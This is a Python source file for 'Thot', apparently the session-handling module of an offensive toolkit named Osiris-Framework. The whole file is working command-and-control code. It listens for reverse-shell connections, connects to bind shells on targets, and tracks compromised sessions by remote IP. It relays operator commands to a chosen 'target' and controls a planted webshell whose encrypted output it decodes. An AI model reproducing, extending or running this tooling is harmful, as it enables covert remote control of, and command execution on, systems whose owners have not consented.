#!/usr/bin/env python3
# Project: Osiris-Framework
# Version 1.337
import json
import sys
import threading
import socket
import requests
import base64
from queue import Queue
from time import sleep
from datetime import datetime
from utilities.Colors import color
from core.thot.ThotCompleter import thot_completer, add_new_session
from core.thot.Help import help
from utilities.ScreenCleaner import ScreenCleaner
from tabulate import tabulate
from os import system
from core.anubis.Anubis import anubis
from utilities.Tools import tools
from utilities.Messages import print_message

print_message.name_module = __file__

_pool_connections = {}
_pool_connections_webshell = {}
_exit_flag = False
_count_connections = 1


class Thot:
    def __init__(self, __user_connection, __type_connection, __consumer=None):
        self.__response_webshell = None
        self.__url_connect_webshell = None
        self.__data_response = None
        self.__remove_connection = None
        self.__new_session = None
        self.__threads_create_worker = None
        self.__user = None
        self.__command = None
        self.__thread_get_target = None
        self.__connection_id_get_target = None
        self.__connection_get_target = None
        self.__target = None
        self.__id_connection_transfer = None
        self.__target_selected = None
        self.__buffer = None
        self.__buffer_size = None
        self.__socket_fd = None
        self.__x = None
        self.__port_work = None
        self.__host_work = None
        self.__port_accept_connections = None
        self.__address_accept_connections = None
        self.__connection_accept_connections = None
        self.__user_data_connection = None
        self.__result_list_connections = None
        self.__count_connect_bind_tcp = None
        self.__sock_connect_bind_tcp = None
        self.__thread_search_bind = None
        self.__session_id_name = None
        self.__response_name_id = None
        self.__port_accept_connections_bind = None
        self.__address_accept_connections_bind = None
        self.__connection_accept_connections_bind = None
        self.__time_of_connection = None
        self.__now = None
        self.__socket = None
        self.__port_socket_create = None
        self.__host_socket_create = None
        self.__address_init_connection, self.__port_init_connection = __user_connection
        self.__type_connection = __type_connection
        self.__queue = Queue()
        self.__number_threads = 2
        self.__jobs_number = [1, 2]
        self.__connection_retry_bind = 7
        self.__length_id_name = 6
        self.__consumer = __consumer

    def add_webshell_connection(self):
        self.__now = datetime.now()
        self.__time_of_connection = " Time Local: ", self.__now.strftime('%H:%M:%S %Y/%m/%d')
        global _count_connections
        global _pool_connections
        global _pool_connections_webshell
        try:
            self.__session_id_name = self.generate_id_connection()

            _pool_connections_webshell[self.__session_id_name] = {
                'hostname_server': self.__address_init_connection,
                'port_server': self.__port_init_connection,
                'type_connection': self.__type_connection,
                'time_session': self.__time_of_connection,
                'username': self.__consumer[2],
                'password': self.__consumer[3],
                'endpoint': self.__consumer[0] + self.__consumer[1],
                'info_connection': color.color("yellow",self.__type_connection.split("/")[-1]) + color.color("red"," -> ") + color.color("green", self.__consumer[0] + self.__consumer[1])
            }
            print(color.color("green", "[ info ] ") + color.color("lgray", "THOT interactive webshell session ") + color.color("yellow", str(_count_connections)) + color.color("lgray", " opened (") + color.color("yellow",self.__address_init_connection) + color.color("red", ":") + color.color("yellow", str(self.__port_init_connection)) + str(" ") + color.color("lgray",str(self.__time_of_connection[0])) + color.color("red", str(self.__time_of_connection[1])) + color.color("lgray", str(")")))

            _count_connections += 1
            add_new_session([key for key in _pool_connections.keys()] + [key for key in _pool_connections_webshell.keys()])

        except Exception as Error:
            print_message.execution_error("There was an error connecting to the remote host {}:{} Error {}".format(
                self.__address_accept_connections, self.__port_accept_connections, Error))

    def socket_create(self, __host, __port):
        try:
            self.__host_socket_create = __host
            self.__port_socket_create = __port
            self.__socket = socket.socket()
        except socket.error as Error:
            print_message.execution_error(Error)

    def generate_id_connection(self):
        self.__response_name_id = tools.generate_id(self.__length_id_name)
        if self.__response_name_id['code'] == 200:
            return self.__response_name_id['message']

    def socket_bind(self):
        try:
            print(color.color("green", "[ info ] ") + color.color("cyan", "Thot is listening on {}:{}...".format(
                self.__host_socket_create, self.__port_socket_create)))

            self.__socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.__socket.bind((self.__host_socket_create, int(self.__port_socket_create)))
            self.__socket.listen(5)
        except socket.error as Error:
            print_message.execution_error("Error starting binding service {} ".format(Error))

            try:
                self.__queue.task_done()
                self.__queue.task_done()
                sys.exit(0)
            except:
                sys.exit(0)

    def accept_connections(self):
        global _pool_connections
        global _count_connections
        global _pool_connections_webshell

        self.__now = datetime.now()
        self.__time_of_connection = " Time Local: ", self.__now.strftime('%H:%M:%S %Y/%m/%d')
        while True:
            try:
                self.__connection_accept_connections, self.__user_data_connection = self.__socket.accept()
                self.__address_accept_connections, self.__port_accept_connections = self.__user_data_connection
                self.__session_id_name = self.generate_id_connection()

                _pool_connections[self.__session_id_name] = {
                    'socket': self.__connection_accept_connections,
                    'ip_local': self.__address_init_connection,
                    'port_local': self.__port_init_connection,
                    'ip_remote': self.__address_accept_connections,
                    'port_remote': self.__port_accept_connections,
                    'type_connection': self.__type_connection,
                    'time_session': self.__time_of_connection,
                    'info_connection': color.color("lgray", "(") + color.color("yellow",
                                                                               self.__address_accept_connections) + color.color(
                        "red", ":") + color.color("yellow", str(self.__port_accept_connections)) + color.color("lgray",
                                                                                                               str(
                                                                                                                   self.__time_of_connection[
                                                                                                                       0])) + color.color(
                        "red", str(self.__time_of_connection[1])) + color.color("lgray", str(")"))
                }

                print(
                    color.color("green", "[ info ] ") + color.color("lgray", "THOT interactive session ") + color.color(
                        "yellow", str(_count_connections)) + color.color("lgray", " opened (") + color.color("yellow",
                                                                                                             self.__address_accept_connections) + color.color(
                        "red", ":") + color.color("yellow", str(self.__port_accept_connections)) + color.color("red",
                                                                                                               str(" -> ")) + color.color(
                        "yellow", str(
                            self.__address_init_connection)) + color.color("red", str(":")) + color.color("yellow", str(
                        self.__port_init_connection)) + str(" ") + color.color("lgray",
                                                                               str(self.__time_of_connection[
                                                                                       0])) + color.color(
                        "red", str(self.__time_of_connection[1])) + color.color("lgray", str(")")))

                _count_connections += 1
                add_new_session([key for key in _pool_connections.keys()] + [key for key in _pool_connections_webshell.keys()])
            except Exception as Error:
                print_message.execution_error("There was an error connecting to the remote host {}:{} Error {}".format(
                    self.__address_accept_connections, self.__port_accept_connections, Error))

    def accept_connections_bind(self, __connection, __data_connection):
        global _pool_connections
        global _pool_connections_webshell
        global _count_connections
        self.__now = datetime.now()
        self.__time_of_connection = " Time Local: ", self.__now.strftime('%H:%M:%S %Y/%m/%d')
        self.__connection_accept_connections_bind = __connection
        self.__address_accept_connections_bind, self.__port_accept_connections_bind = __data_connection

        try:
            self.__session_id_name = self.generate_id_connection()

            _pool_connections[self.__session_id_name] = {
                'socket': self.__connection_accept_connections_bind,
                'ip_local': self.__address_init_connection,
                'port_local': self.__port_init_connection,
                'ip_remote': self.__address_accept_connections_bind,
                'port_remote': self.__port_accept_connections_bind,
                'type_connection': self.__type_connection,
                'time_session': self.__time_of_connection,
                'info_connection': color.color("lgray", "(") + color.color("yellow",
                                                                           self.__address_accept_connections_bind) + color.color(
                    "red", ":") + color.color("yellow", str(self.__port_accept_connections_bind)) + color.color("lgray",
                                                                                                                str(
                                                                                                                    self.__time_of_connection[
                                                                                                                        0])) + color.color(
                    "red", str(self.__time_of_connection[1])) + color.color("lgray", str(")"))
            }

            print(color.color("green", "[ info ] ") + color.color("lgray", "THOT interactive session ") + color.color(
                "yellow", str(_count_connections)) + color.color("lgray", " opened (") + color.color("yellow",
                                                                                                     self.__address_accept_connections_bind) + color.color(
                "red", ":") + color.color("yellow", str(self.__port_accept_connections_bind)) + color.color("red",
                                                                                                            str(" -> ")) + color.color(
                "yellow", str(
                    self.__address_init_connection)) + color.color("red", str(":")) + color.color("yellow", str(
                self.__port_init_connection)) + str(" ") + color.color("lgray",
                                                                       str(self.__time_of_connection[0])) + color.color(
                "red", str(self.__time_of_connection[1])) + color.color("lgray", str(")")))

            _count_connections += 1
            add_new_session([key for key in _pool_connections.keys()] + [key for key in _pool_connections_webshell.keys()])

        except Exception as Error:
            print_message.execution_error("There was an error connecting to the remote host {}:{} Error {}".format(
                self.__address_accept_connections_bind, self.__port_accept_connections_bind, Error))

    def search_bind(self):
        self.__thread_search_bind = threading.Thread(target=self.connect_bind_tcp, args=())
        self.__thread_search_bind.daemon = True
        self.__thread_search_bind.start()

    def connect_bind_tcp(self):
        self.__count_connect_bind_tcp = 1
        while self.__connection_retry_bind > self.__count_connect_bind_tcp:
            try:
                self.__sock_connect_bind_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.__sock_connect_bind_tcp.connect((self.__address_init_connection, int(self.__port_init_connection)))
                self.accept_connections_bind(self.__sock_connect_bind_tcp,
                                             [self.__address_init_connection, int(self.__port_init_connection)])
                return True
            except socket.error as Error:
                print_message.execution_info(
                    "Trying {} to connect with {}:{}".format(self.__count_connect_bind_tcp, self.__host_socket_create,
                                                             self.__port_socket_create))
                sleep(1)
                self.__count_connect_bind_tcp += 1

        return True

    def list_connections(self):
        global _pool_connections
        global _pool_connections_webshell
        self.__result_list_connections = [
            [color.color('yellow', 'ID'), color.color('yellow', 'TYPE'), color.color('yellow', 'HOST'),
             color.color('yellow', 'PORT'), color.color('yellow', 'DESCRIPTION CONNECTION')]]

        if len(_pool_connections) <= 0 and len(_pool_connections_webshell) <=0:
            self.__result_list_connections.append(
                [color.color('red', 'NOT CONNECTIONS'), color.color('red', 'CONNECTIONS'),
                 color.color('red', 'CONNECTIONS'), color.color('red', 'NOT CONNECTIONS')])

            print('\n')
            print(tabulate(self.__result_list_connections, headers='firstrow', tablefmt='simple', stralign='center'))

            return

        try:
            for __key, __connection in _pool_connections.items():
                self.__result_list_connections.append(
                    [color.color("green_ptrl", str(__key)),
                     color.color("lgray", str(_pool_connections[__key]['type_connection'])),
                     color.color("green", str(_pool_connections[__key]['ip_remote'])),
                     color.color("green", str(_pool_connections[__key]['port_remote'])),
                     str(_pool_connections[__key]['info_connection'])])

            for __key, __connection in _pool_connections_webshell.items():
                self.__result_list_connections.append(
                    [color.color("green_ptrl", str(__key)),
                     color.color("lgray", str(_pool_connections_webshell[__key]['type_connection'])),
                     color.color("green", str(_pool_connections_webshell[__key]['hostname_server'])),
                     color.color("green", str(_pool_connections_webshell[__key]['port_server'])),
                     str(_pool_connections_webshell[__key]['info_connection'])])
        except Exception as Error:
            print(Error)
            self.__result_list_connections.append(
                [color.color('red', 'NOT CONNECTIONS'), color.color('red', 'CONNECTIONS'),
                 color.color('red', 'CONNECTIONS'), color.color('red', 'NOT CONNECTIONS')])

        try:
            pass
        except Exception as Error:
            print(Error)

        print('\n')
        print(tabulate(self.__result_list_connections, headers='firstrow', tablefmt='simple', stralign='center'))

    def kill_all_connections(self, signal=None, frame=None):
        global _pool_connections

        try:
            for __key, __connection in _pool_connections.items():
                _pool_connections[__key]['socket'].shutdown(2)
                _pool_connections[__key]['socket'].close()

        except Exception as Error:
            print_message.execution_error("Could not close connection {}".format(Error))

    def create_worker(self):
        for _ in range(self.__number_threads):
            self.__threads_create_worker = threading.Thread(target=self.work, daemon=True)
            self.__threads_create_worker.start()
        return

    def work(self):
        try:
            self.__host_work = self.__address_init_connection
            self.__port_work = self.__port_init_connection
        except Exception as Error:
            print_message.execution_error("Connection information not included")
            self.__queue.task_done()
            self.__queue.task_done()
            sys.exit(0)

        while True:
            self.__x = self.__queue.get()

            if self.__x == 1:
                self.socket_create(self.__host_work, self.__port_work)
                self.socket_bind()
                self.accept_connections()

            if self.__x == 2:
                try:
                    self.__queue.task_done()
                    self.__queue.task_done()
                    break
                except:
                    break

            try:
                self.__queue.task_done()
            except:
                pass

        return

    def remove_client_connection(self, __id_connection):
        global _pool_connections
        global _pool_connections_webshell

        try:
            for __key, __connection in _pool_connections.items():
                if str(__key.strip().lower()) == str(__id_connection.strip().lower()):
                    try:
                        _pool_connections[__key]["socket"].close()
                    except Exception as Error:
                        pass
                    del _pool_connections[__key]
                    break
        except Exception as Error:
            pass

        try:
            for __key, __connection in _pool_connections_webshell.items():
                if str(__key.strip().lower()) == str(__id_connection.strip().lower()):
                    del _pool_connections_webshell[__key]
                    break
        except Exception as Error:
            pass


        add_new_session([key for key in _pool_connections.keys()] + [key for key in _pool_connections_webshell.keys()])
        return

    def transfer(self, __id_connection, __connection):
        global _exit_flag
        self.__socket_fd = __connection
        self.__buffer_size = 0x2000  # 0x400
        self.__id_connection_transfer = __id_connection

        while True:
            if _exit_flag:
                print_message.execution_info("The interactive session has ended.")
                _exit_flag = False
                break

            try:
                self.__buffer = self.__socket_fd.recv(self.__buffer_size)
                _exit_flag = False
            except Exception as Error:
                _exit_flag = False
                print(self.__target_selected)
                self.remove_client_connection(self.__id_connection_transfer)
                break

            if not self.__buffer:
                print_message.execution_error("No data Breaking...")
                print(self.__target_selected)
                self.remove_client_connection(self.__id_connection_transfer)
                _exit_flag = False

            try:

                try:
                    self.__data_response = json.loads(self.__buffer.decode('utf-8'))
                    anubis.processor(self.__socket_fd, self.__data_response)
                except json.decoder.JSONDecodeError as Error:
                    if self.__buffer.decode('utf-8') == 'recv_download_file':
                        anubis.processor(self.__socket_fd, {'recv_download_file': self.__buffer})
                    else:
                        sys.stdout.write(color.color("lgray", self.__buffer.decode('utf-8')))
                except UnicodeDecodeError:
                    pass
            except KeyboardInterrupt:
                print_message.execution_error("Target {} Lost".format(self.__id_connection_transfer))

        return

    def create_jobs(self):
        for __x in self.__jobs_number:
            self.__queue.put(__x)
        self.__queue.join()

    def get_targets(self, __cmd):
        global _exit_flag
        global _pool_connections
        _exit_flag = False

        self.__target = __cmd.replace('select', '')

        try:
            for __key, __connection in _pool_connections.items():
                if str(__key.strip().lower()) == str(self.__target.strip().lower()):
                    self.__connection_get_target = _pool_connections[__key]["socket"]
                    self.__connection_id_get_target = __key

                    self.__target_selected = color.color("yellow", "[!] ") + color.color("red",
                                                                                         "The connection to the target has been lost: ") + color.color(
                        "yellow", _pool_connections[__key]['ip_remote'])
                    print(color.color("green", "[ info ] ") + color.color("cyan", "Select Target:") + color.color(
                        "yellow", _pool_connections[__key]['ip_remote']))
        except Exception as Error:
            pass

        self.__thread_get_target = threading.Thread(target=self.transfer, args=(
            self.__connection_id_get_target, self.__connection_get_target,))
        self.__thread_get_target.start()

        try:
            while True:
                self.__command = input(
                    color.color("underline", color.color("lgray", "%s" % "anubis")) + " " + color.color('lgray',
                                                                                                           '>') + " ").strip()
                if self.__command == "exit":
                    _exit_flag = True
                    self.__connection_get_target.send(str.encode('\n'))
                    print("\n")
                    break

                _exit_flag = False
                self.__connection_get_target.send(str.encode(self.__command + "\n"))
        except:
            _exit_flag = False
            print(self.__target_selected)

        sleep(0.125)

    def _decrypt(self, ciphertext, key):
      # Crear una cadena de bytes con la clave
      self.__key_bytes = [b for b in key.encode('utf-8')]

      # Descifrar el texto con XOR y la clave
      self.__plaintext = ''
      self.__ciphertext_bytes = base64.b64decode(ciphertext.encode('utf-8'))

      for i in range(len(self.__ciphertext_bytes)):
        self.__plaintext += chr(self.__ciphertext_bytes[i] ^ self.__key_bytes[i % len(self.__key_bytes)])

      # Devolver el texto descifrado
      return self.__plaintext
    def console_webshell(self, __session_id, __path):
        self.__user = "webshell"
        while True:
            self.__command = input(
                color.color("underline", color.color("lgray", "%s" % self.__user)) + " " + color.color('lgray',
                                                                                                       '>') + " ").strip()

            if self.__command == "sessions":
                self.list_connections()
            elif self.__command == "clear" or self.__command == "clean":
                ScreenCleaner()
            elif self.__command.split(" ")[0] == 'exec' or self.__command.split(" ")[0] == 'execute':
                try:
                    self.__command = list(self.__command.split(" "))
                    self.__command.remove('exec' if self.__command[0] == 'exec' else 'execute')
                    system(' '.join(self.__command))
                except IndexError:
                    print_message.execution_info("Please Enter command")
            elif self.__command == "background" or self.__command == "exit":
                break
            else:
                try:
                    self.__url_connect_webshell = "{}?user={}&pwd={}&load={}".format(_pool_connections_webshell[__session_id]['endpoint'], _pool_connections_webshell[__session_id]['username'], _pool_connections_webshell[__session_id]['password'], self.__command)
                    self.__response_webshell = requests.get(self.__url_connect_webshell)
                    print(self._decrypt(self.__response_webshell.text, _pool_connections_webshell[__session_id]['password']))
                except Exception as Error:
                    print_message.execution_error(Error)

    def console(self, __session, __path):
        global _exit_flag
        thot_completer()
        _exit_flag = False

        if 'select' in __session:
            if __session.replace('select', '').strip() in _pool_connections_webshell:
                self.console_webshell(__session.replace('select', '').strip(), __path)
            else:
                self.get_targets(__session)

        self.__user = "interpreter"

        while True:
            self.__command = input(
                color.color("underline", color.color("lgray", "%s" % self.__user)) + " " + color.color('lgray',
                                                                                                       '>') + " ").strip()
            if self.__command == "sessions":
                self.list_connections()
            elif "select" in self.__command:
                if self.__command.replace('select', '').strip() in _pool_connections_webshell:
                    self.console_webshell(self.__command.replace('select', '').strip(),__path)
                else:
                    self.get_targets(self.__command)
            elif "kill" in self.__command:
                try:
                    self.__remove_connection = self.__command.split(" ")[1]
                    for key in _pool_connections.keys():
                        if str(key.strip().lower()) == str(self.__remove_connection.strip().lower()):
                            print_message.execution_info("killing connection {} please wait.".format(key))
                            self.remove_client_connection(key)

                    for key in _pool_connections_webshell.keys():
                        if str(key.strip().lower()) == str(self.__remove_connection.strip().lower()):
                            print_message.execution_info("killing connection {} please wait.".format(key))
                            self.remove_client_connection(key)
                except Exception as Error:
                    continue
            elif self.__command == "":
                continue
            elif self.__command == "background" or self.__command == "exit":
                if __path == "module":
                    from core.ModuleInterpreter import module_completer
                    module_completer()
                elif __path == "base":
                    from core.Completer import completer
                    completer()
                else:
                    from core.ModuleInterpreter import module_completer
                    module_completer()

                print_message.execution_info("Running THOT in the background")

                try:
                    self.__queue.task_done()
                    self.__queue.task_done()
                    break
                except:
                    break

            elif self.__command == "help":
                help.commands_core_thot()
            elif self.__command == "clear" or self.__command == "clean":
                ScreenCleaner()
            elif self.__command.split(" ")[0] == 'exec' or self.__command.split(" ")[0] == 'execute':
                try:
                    self.__command = list(self.__command.split(" "))
                    self.__command.remove('exec' if self.__command[0] == 'exec' else 'execute')
                    system(' '.join(self.__command))
                except IndexError:
                    print_message.execution_info("Please Enter command")
            else:
                print_message.execution_error("Command not found")


